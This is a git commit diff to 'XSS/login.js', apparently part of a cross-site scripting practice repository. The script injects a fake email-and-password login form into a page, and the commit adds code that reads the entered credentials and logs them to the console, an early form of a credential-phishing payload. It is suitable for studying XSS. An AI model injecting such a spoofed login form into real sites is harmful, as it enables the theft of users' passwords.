7c4577489dcb85a56699feb9caa818809438073e
nullsc <53406164+nullsc@users.noreply.github.com>
2024-03-05 00:09:30 +0000

    Update login.js

--- XSS/login.js
+++ XSS/login.js
@@ -4,8 +4,8 @@ box.innerHTML = `
 
   <form id="xssform">
     <div>
-      <input type="email" class="" placeholder="Email address">
-      <input type="password" class="" placeholder="Password">
+      <input type="email" name="username" class="" placeholder="Email address">
+      <input type="password" name="password" class="" placeholder="Password">
       <button id="xssbutton" type="submit" class="">Submit</button>
     </div>
   </form>
@@ -18,9 +18,15 @@ box.style.margin = "0 auto";
 box.style.background = "green";
 box.style.padding = "10px";
 document.body.appendChild(box);
-document.querySelector("#xssbutton").addEventListener("click", (e) => {
-  e.stopPropagation();
-  e.preventDefault();
 
-  console.log("button clicked!")
+document.querySelector("#xssbutton").addEventListener("click", (e) => {
+	e.stopPropagation();
+	e.preventDefault();
+	const formd = document.querySelector("#xssform");
+
+	console.log("button clicked!" )
+	var data = new FormData(formd);
+	for (var [key, value] of data) {
+		console.log(key, value)
+	}
 });
